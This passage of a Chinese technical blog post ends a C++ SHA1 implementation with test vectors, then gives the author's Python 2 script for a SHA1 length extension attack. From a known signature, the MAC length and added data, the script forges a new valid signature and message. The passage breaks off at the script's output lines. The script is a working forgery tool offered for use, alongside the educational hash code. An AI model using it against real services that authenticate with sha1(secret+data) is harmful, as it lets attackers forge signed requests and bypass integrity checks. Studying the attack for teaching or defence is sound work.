class="comment">//如果这个block还无法处理，其后面的长度无法容纳长度64bit，那么先处理这个block</span></span><br><span class="line">    <span class="keyword">if</span> <span class="params">(index &gt; <span class="number">14</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        while <span class="params">(index &lt; <span class="number">16</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            message[index++] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        zen_sha1_process_block<span class="params">(ctx-&gt;hash_, message)</span>;</span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//补0</span></span><br><span class="line">    while <span class="params">(index &lt; <span class="number">14</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        message[index++] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存长度，注意是bit位的长度,这个问题让我看着郁闷了半天，</span></span><br><span class="line">    uint64_t data_len = <span class="params">(ctx-&gt;length_)</span> &lt;&lt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注意SHA1算法要求的64bit的长度是大头BIG-ENDIAN，在小头的世界要进行转换</span></span><br><span class="line"><span class="built_in">#</span><span class="keyword">if</span> ZEN_BYTES_ORDER == ZEN_LITTLE_ENDIAN</span><br><span class="line">    data_len = ZEN_SWAP_UINT64<span class="params">(data_len)</span>;</span><br><span class="line"><span class="built_in">#</span>endif</span><br><span class="line"></span><br><span class="line">    message[<span class="number">14</span>] = <span class="params">(uint32_t)</span> <span class="params">(data_len &amp; <span class="number">0</span>x00000000FFFFFFFF)</span>;</span><br><span class="line">    message[<span class="number">15</span>] = <span class="params">(uint32_t)</span> <span class="params">(<span class="params">(data_len &amp; <span class="number">0</span>xFFFFFFFF00000000ULL)</span> &gt;&gt; <span class="number">32</span>)</span>;</span><br><span class="line"></span><br><span class="line">    zen_sha1_process_block<span class="params">(ctx-&gt;hash_, message)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注意结果是大头党的，在小头的世界要进行转换</span></span><br><span class="line"><span class="built_in">#</span><span class="keyword">if</span> ZEN_BYTES_ORDER == ZEN_LITTLE_ENDIAN</span><br><span class="line">    swap_uint32_memcpy<span class="params">(result, &amp;ctx-&gt;hash_, ZEN_SHA1_HASH_SIZE)</span>;</span><br><span class="line"><span class="built_in">#</span><span class="keyword">else</span></span><br><span class="line">    memcpy<span class="params">(result, &amp;ctx-&gt;hash_, ZEN_SHA1_HASH_SIZE)</span>;</span><br><span class="line"><span class="built_in">#</span>endif</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//计算一个内存数据的SHA1值</span></span><br><span class="line">unsigned char <span class="built_in">*</span>ZEN_LIB::sha1<span class="params">(const unsigned char *msg,</span><br><span class="line">                             size_t size,</span><br><span class="line">                             unsigned char result[ZEN_SHA1_HASH_SIZE])</span></span><br><span class="line">&#123;</span><br><span class="line">    assert<span class="params">(result != NULL)</span>;</span><br><span class="line"></span><br><span class="line">    sha1_ctx ctx;</span><br><span class="line">    zen_sha1_init<span class="params">(&amp;ctx)</span>;</span><br><span class="line">    zen_sha1_update<span class="params">(&amp;ctx, msg, size)</span>;</span><br><span class="line">    zen_sha1_final<span class="params">(&amp;ctx, msg, size, result)</span>;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main<span class="params">(int /*argc*/, char * /*argv*/[])</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    int ret = <span class="number">0</span>;</span><br><span class="line">    static unsigned char test_buf[<span class="number">7</span>][<span class="number">81</span>] =</span><br><span class="line">    &#123;</span><br><span class="line">        &#123; <span class="string">""</span> &#125;,</span><br><span class="line">        &#123; <span class="string">"a"</span> &#125;,</span><br><span class="line">        &#123; <span class="string">"abc"</span> &#125;,</span><br><span class="line">        &#123; <span class="string">"message digest"</span> &#125;,</span><br><span class="line">        &#123; <span class="string">"abcdefghijklmnopqrstuvwxyz"</span> &#125;,</span><br><span class="line">        &#123; <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"</span> &#125;,</span><br><span class="line">        &#123; <span class="string">"12345678901234567890123456789012345678901234567890123456789012345678901234567890"</span> &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    static const size_t test_buflen[<span class="number">7</span>] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">26</span>, <span class="number">62</span>, <span class="number">80</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// static const unsigned char md5_test_sum[7][16] =</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     &#123; 0xD4, 0x1D, 0x8C, 0xD9, 0x8F, 0x00, 0xB2, 0x04,  0xE9, 0x80, 0x09, 0x98, 0xEC, 0xF8, 0x42, 0x7E &#125;,</span></span><br><span class="line">    <span class="comment">//     &#123; 0x0C, 0xC1, 0x75, 0xB9, 0xC0, 0xF1, 0xB6, 0xA8,  0x31, 0xC3, 0x99, 0xE2, 0x69, 0x77, 0x26, 0x61 &#125;,</span></span><br><span class="line">    <span class="comment">//     &#123; 0x90, 0x01, 0x50, 0x98, 0x3C, 0xD2, 0x4F, 0xB0,  0xD6, 0x96, 0x3F, 0x7D, 0x28, 0xE1, 0x7F, 0x72 &#125;,</span></span><br><span class="line">    <span class="comment">//     &#123; 0xF9, 0x6B, 0x69, 0x7D, 0x7C, 0xB7, 0x93, 0x8D,  0x52, 0x5A, 0x2F, 0x31, 0xAA, 0xF1, 0x61, 0xD0 &#125;,</span></span><br><span class="line">    <span class="comment">//     &#123; 0xC3, 0xFC, 0xD3, 0xD7, 0x61, 0x92, 0xE4, 0x00,  0x7D, 0xFB, 0x49, 0x6C, 0xCA, 0x67, 0xE1, 0x3B &#125;,</span></span><br><span class="line">    <span class="comment">//     &#123; 0xD1, 0x74, 0xAB, 0x98, 0xD2, 0x77, 0xD9, 0xF5,  0xA5, 0x61, 0x1C, 0x2C, 0x9F, 0x41, 0x9D, 0x9F &#125;,</span></span><br><span class="line">    <span class="comment">//     &#123; 0x57, 0xED, 0xF4, 0xA2, 0x2B, 0xE3, 0xC9, 0x55,  0xAC, 0x49, 0xDA, 0x2E, 0x21, 0x07, 0xB6, 0x7A &#125;</span></span><br><span class="line">    <span class="comment">// &#125;;</span></span><br><span class="line">    unsigned char result[<span class="number">32</span>] =&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for(size_t i=0;i&lt;7;++i)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     ZEN_LIB::md5(test_buf[i],test_buflen[i],result);</span></span><br><span class="line">    <span class="comment">//     ret = memcmp(result,md5_test_sum[i],16);</span></span><br><span class="line">    <span class="comment">//     if (ret != 0)</span></span><br><span class="line">    <span class="comment">//     &#123;</span></span><br><span class="line">    <span class="comment">//         assert(false);</span></span><br><span class="line">    <span class="comment">//     &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    static const unsigned char sha1_test_sum[<span class="number">7</span>][<span class="number">20</span>] =</span><br><span class="line">    &#123;</span><br><span class="line">        &#123; <span class="number">0</span>xda,<span class="number">0</span>x39,<span class="number">0</span>xa3,<span class="number">0</span>xee,<span class="number">0</span>x5e,<span class="number">0</span>x6b,<span class="number">0</span>x4b,<span class="number">0</span>x0d,<span class="number">0</span>x32,<span class="number">0</span>x55,<span class="number">0</span>xbf,<span class="number">0</span>xef,<span class="number">0</span>x95,<span class="number">0</span>x60,<span class="number">0</span>x18,<span class="number">0</span>x90,<span class="number">0</span>xaf,<span class="number">0</span>xd8,<span class="number">0</span>x07,<span class="number">0</span>x09 &#125;,</span><br><span class="line">        &#123; <span class="number">0</span>x86,<span class="number">0</span>xf7,<span class="number">0</span>xe4,<span class="number">0</span>x37,<span class="number">0</span>xfa,<span class="number">0</span>xa5,<span class="number">0</span>xa7,<span class="number">0</span>xfc,<span class="number">0</span>xe1,<span class="number">0</span>x5d,<span class="number">0</span>x1d,<span class="number">0</span>xdc,<span class="number">0</span>xb9,<span class="number">0</span>xea,<span class="number">0</span>xea,<span class="number">0</span>xea,<span class="number">0</span>x37,<span class="number">0</span>x76,<span class="number">0</span>x67,<span class="number">0</span>xb8 &#125;,</span><br><span class="line">        &#123; <span class="number">0</span>xa9,<span class="number">0</span>x99,<span class="number">0</span>x3e,<span class="number">0</span>x36,<span class="number">0</span>x47,<span class="number">0</span>x06,<span class="number">0</span>x81,<span class="number">0</span>x6a,<span class="number">0</span>xba,<span class="number">0</span>x3e,<span class="number">0</span>x25,<span class="number">0</span>x71,<span class="number">0</span>x78,<span class="number">0</span>x50,<span class="number">0</span>xc2,<span class="number">0</span>x6c,<span class="number">0</span>x9c,<span class="number">0</span>xd0,<span class="number">0</span>xd8,<span class="number">0</span>x9d &#125;,</span><br><span class="line">        &#123; <span class="number">0</span>xc1,<span class="number">0</span>x22,<span class="number">0</span>x52,<span class="number">0</span>xce,<span class="number">0</span>xda,<span class="number">0</span>x8b,<span class="number">0</span>xe8,<span class="number">0</span>x99,<span class="number">0</span>x4d,<span class="number">0</span>x5f,<span class="number">0</span>xa0,<span class="number">0</span>x29,<span class="number">0</span>x0a,<span class="number">0</span>x47,<span class="number">0</span>x23,<span class="number">0</span>x1c,<span class="number">0</span>x1d,<span class="number">0</span>x16,<span class="number">0</span>xaa,<span class="number">0</span>xe3 &#125;,</span><br><span class="line">        &#123; <span class="number">0</span>x32,<span class="number">0</span>xd1,<span class="number">0</span>x0c,<span class="number">0</span>x7b,<span class="number">0</span>x8c,<span class="number">0</span>xf9,<span class="number">0</span>x65,<span class="number">0</span>x70,<span class="number">0</span>xca,<span class="number">0</span>x04,<span class="number">0</span>xce,<span class="number">0</span>x37,<span class="number">0</span>xf2,<span class="number">0</span>xa1,<span class="number">0</span>x9d,<span class="number">0</span>x84,<span class="number">0</span>x24,<span class="number">0</span>x0d,<span class="number">0</span>x3a,<span class="number">0</span>x89 &#125;,</span><br><span class="line">        &#123; <span class="number">0</span>x76,<span class="number">0</span>x1c,<span class="number">0</span>x45,<span class="number">0</span>x7b,<span class="number">0</span>xf7,<span class="number">0</span>x3b,<span class="number">0</span>x14,<span class="number">0</span>xd2,<span class="number">0</span>x7e,<span class="number">0</span>x9e,<span class="number">0</span>x92,<span class="number">0</span>x65,<span class="number">0</span>xc4,<span class="number">0</span>x6f,<span class="number">0</span>x4b,<span class="number">0</span>x4d,<span class="number">0</span>xda,<span class="number">0</span>x11,<span class="number">0</span>xf9,<span class="number">0</span>x40 &#125;,</span><br><span class="line">        &#123; <span class="number">0</span>x50,<span class="number">0</span>xab,<span class="number">0</span>xf5,<span class="number">0</span>x70,<span class="number">0</span>x6a,<span class="number">0</span>x15,<span class="number">0</span>x09,<span class="number">0</span>x90,<span class="number">0</span>xa0,<span class="number">0</span>x8b,<span class="number">0</span>x2c,<span class="number">0</span>x5e,<span class="number">0</span>xa4,<span class="number">0</span>x0f,<span class="number">0</span>xa0,<span class="number">0</span>xe5,<span class="number">0</span>x85,<span class="number">0</span>x55,<span class="number">0</span>x47,<span class="number">0</span>x32 &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ZEN_LIB::sha1<span class="params">(test_buf[<span class="number">0</span>],test_buflen[<span class="number">0</span>],result)</span>;</span><br><span class="line">    <span class="comment">// for (int i=0; i &lt; 20; i++)</span></span><br><span class="line">    <span class="comment">//  printf("0x%02x\n", result[i]);</span></span><br><span class="line">    return <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于Length Extension Attack，由于我太菜了，难以叙说，还是直接上我写的一个利用脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ROTL32</span><span class="params">(x, r)</span>:</span></span><br><span class="line">    x, r = int(x), int(r)</span><br><span class="line">    <span class="keyword">return</span> (x &lt;&lt; r) ^ (x &gt;&gt; (<span class="number">32</span> - r))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SHA1Attack</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span><br><span class="line">    SHA1 Length extend attack by Hcamael</span><br><span class="line">    s = sha1(mac+m)</span><br><span class="line">    if we know s, we can calculate sha1(mac+m+padding+msg)</span><br><span class="line">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, options)</span>:</span></span><br><span class="line">        self.hash_ = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">40</span>, <span class="number">8</span>):</span><br><span class="line">            self.hash_[x/<span class="number">8</span>] = int(options.signal[x:x+<span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line">        self.length_ = len(options.extend) + ((options.macl + len(options.origin)) / <span class="number">64</span> + <span class="number">1</span>) * <span class="number">64</span></span><br><span class="line">        <span class="keyword">print</span> self.length_</span><br><span class="line">        self.str_to_block(options.extend)</span><br><span class="line">        self.block = self.padding()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">(self)</span>:</span></span><br><span class="line">        message = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">            message.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">            tmp = struct.pack(<span class="string">"I"</span>, self.block[x])</span><br><span class="line">            message[x] = int(tmp.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        index = (self.length_ &amp; <span class="number">63</span>) &gt;&gt; <span class="number">2</span></span><br><span class="line">        shift = (self.length_ &amp; <span class="number">3</span>) * <span class="number">8</span></span><br><span class="line">        message[index] &amp;= ~(<span class="number">0xFFFFFFFF</span> &lt;&lt; shift)</span><br><span class="line">        message[index] ^= <span class="number">0x80</span> &lt;&lt; shift</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> index &gt; <span class="number">14</span>:</span><br><span class="line">            <span class="keyword">while</span> index &lt; <span class="number">16</span>:</span><br><span class="line">                message[index] = <span class="number">0</span></span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 进行大小端转换</span></span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">                tmp = struct.pack(<span class="string">"I"</span>, message[x])</span><br><span class="line">                message[x] = int(tmp.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">            self.block = message</span><br><span class="line">            self.sha1_process()</span><br><span class="line">            index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> index &lt; <span class="number">14</span>:</span><br><span class="line">            message[index] = <span class="number">0</span></span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        data_len = self.length_ &lt;&lt; <span class="number">3</span></span><br><span class="line">        data_len = int(struct.pack(<span class="string">"L"</span>, data_len).encode(<span class="string">"hex"</span>), <span class="number">16</span>)</span><br><span class="line">        message[<span class="number">14</span>] = data_len &amp; <span class="number">0x00000000FFFFFFFF</span></span><br><span class="line">        message[<span class="number">15</span>] = (data_len &amp; <span class="number">0xFFFFFFFF00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">        <span class="comment"># 进行大小端转换</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">            tmp = struct.pack(<span class="string">"I"</span>, message[x])</span><br><span class="line">            message[x] = int(tmp.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">str_to_block</span><span class="params">(self, msg)</span>:</span></span><br><span class="line">        self.block = []</span><br><span class="line">        msg += (<span class="number">64</span> - self.length_%<span class="number">64</span>) * <span class="string">'\x00'</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,  <span class="number">64</span>, <span class="number">4</span>):</span><br><span class="line">            tmp = msg[i: i + <span class="number">4</span>]</span><br><span class="line">            tmp = int(tmp.encode(<span class="string">'hex'</span>) <span class="keyword">or</span> <span class="string">'0'</span>, <span class="number">16</span>)</span><br><span class="line">            self.block.append(tmp)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">calculate</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sha1_process()</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">5</span>):</span><br><span class="line">            self.hash_[x] = ctypes.c_uint32(self.hash_[x])</span><br><span class="line">        result = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> self.hash_:</span><br><span class="line">            result += <span class="string">"&#123;:0&gt;8&#125;"</span>.format(hex(x.value)[<span class="number">2</span>:-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sha1_process</span><span class="params">(self)</span>:</span></span><br><span class="line">        wblock = []</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">80</span>):</span><br><span class="line">            wblock.append(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">16</span>):</span><br><span class="line">            wblock[x] = self.block[x]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">16</span>, <span class="number">80</span>):</span><br><span class="line">            wblock[x] = ROTL32(wblock[x - <span class="number">3</span>] ^ wblock[x - <span class="number">8</span>] ^ wblock[x - <span class="number">14</span>] ^ wblock[x - <span class="number">16</span>], <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">        a = self.hash_[<span class="number">0</span>]</span><br><span class="line">        b = self.hash_[<span class="number">1</span>]</span><br><span class="line">        c = self.hash_[<span class="number">2</span>]</span><br><span class="line">        d = self.hash_[<span class="number">3</span>]</span><br><span class="line">        e = self.hash_[<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">20</span>):</span><br><span class="line"></span><br><span class="line">            temp = ROTL32(a, <span class="number">5</span>) + (((c ^ d) &amp; b) ^ d) + e + wblock[x] + <span class="number">0x5A827999</span></span><br><span class="line">            temp &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">            e = d</span><br><span class="line">            d = c</span><br><span class="line">            c = ROTL32(b, <span class="number">30</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            b = a</span><br><span class="line">            a = temp</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">20</span>, <span class="number">40</span>):</span><br><span class="line">            temp = ROTL32(a, <span class="number">5</span>) + (b ^ c ^ d) + e + wblock[x] + <span class="number">0x6ED9EBA1</span></span><br><span class="line">            temp &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">            e = d</span><br><span class="line">            d = c</span><br><span class="line">            c = ROTL32(b, <span class="number">30</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            b = a</span><br><span class="line">            a = temp</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">40</span>, <span class="number">60</span>):</span><br><span class="line">            temp = ROTL32(a, <span class="number">5</span>) + ((b &amp; c) | (b &amp; d) | (c &amp; d)) + e + wblock[x] + <span class="number">0x8F1BBCDC</span></span><br><span class="line">            temp &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">            e = d</span><br><span class="line">            d = c</span><br><span class="line">            c = ROTL32(b, <span class="number">30</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            b = a</span><br><span class="line">            a = temp</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">60</span>, <span class="number">80</span>):</span><br><span class="line">            temp = ROTL32(a, <span class="number">5</span>) + (b ^ c ^ d) + e + wblock[x] + <span class="number">0xCA62C1D6</span></span><br><span class="line">            temp &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line">            e = d</span><br><span class="line">            d = c</span><br><span class="line">            c = ROTL32(b, <span class="number">30</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            b = a</span><br><span class="line">            a = temp</span><br><span class="line"></span><br><span class="line">        self.hash_[<span class="number">0</span>] += a</span><br><span class="line">        self.hash_[<span class="number">1</span>] += b</span><br><span class="line">        self.hash_[<span class="number">2</span>] += c</span><br><span class="line">        self.hash_[<span class="number">3</span>] += d</span><br><span class="line">        self.hash_[<span class="number">4</span>] += e</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">5</span>):</span><br><span class="line">            self.hash_[x] &amp;= <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_parse</span><span class="params">()</span>:</span></span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">"--macl"</span>,</span><br><span class="line">        dest=<span class="string">"macl"</span>,</span><br><span class="line">        type=<span class="string">"int"</span>,</span><br><span class="line">        help=<span class="string">"Please enter the length of mac"</span>)</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">"--o"</span>,</span><br><span class="line">        dest=<span class="string">"origin"</span>,</span><br><span class="line">        help=<span class="string">"sha1(mac+origin), Please enter the origin"</span>)</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">"--sign"</span>,</span><br><span class="line">        dest=<span class="string">"signal"</span>,</span><br><span class="line">        help=<span class="string">"signal=sha1(mac+origin), Please enter the signal"</span>)</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">"--e"</span>,</span><br><span class="line">        dest=<span class="string">"extend"</span>,</span><br><span class="line">        help=<span class="string">"Please enter the extend value"</span>)</span><br><span class="line">    <span class="keyword">return</span> parser</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parser = add_parse()</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (options.macl <span class="keyword">and</span> options.origin <span class="keyword">and</span> options.signal <span class="keyword">and</span> options.extend):</span><br><span class="line">        parser.parse_args([<span class="string">'sha1-length-extend-attack.py'</span>, <span class="string">'-h'</span>])</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    o_data_length = options.macl + len(options.origin)</span><br><span class="line">    p = <span class="number">64</span> - <span class="number">8</span> - <span class="number">1</span> - o_data_length</span><br><span class="line">    n = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> p &lt; <span class="number">0</span>:</span><br><span class="line">        p = <span class="number">64</span> * n - <span class="number">8</span> - <span class="number">1</span> - o_data_length</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line">    o_data_length *= <span class="number">8</span></span><br><span class="line">    o_data_length = <span class="string">"&#123;:0&gt;16&#125;"</span>.format(hex(o_data_length)[<span class="number">2</span>:])</span><br><span class="line">    data_l = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">16</span>, <span class="number">2</span>):</span><br><span class="line">        data_l += <span class="string">"\\x"</span> + o_data_length[x:x+<span class="number">2</span>]</span><br><span class="line">    cal = SHA1Attack(options)</span><br><span class="line">    result = cal.calculate()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"+---------------------------+"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"|         Result             |"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"+---------------------------+"</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Origin signal: "</span> + options.signal</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"New signal: "</span> + result</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"New msg: "</span> + <span class="string">"("</span> + str(options.macl) + <span class="string">" bytes unknow MAC) + "</span> + options.origin + <span class="string">"\\x80"</span> + <span class="string">"\\x00"</span> * p + data_l + options.extend</span><br><span 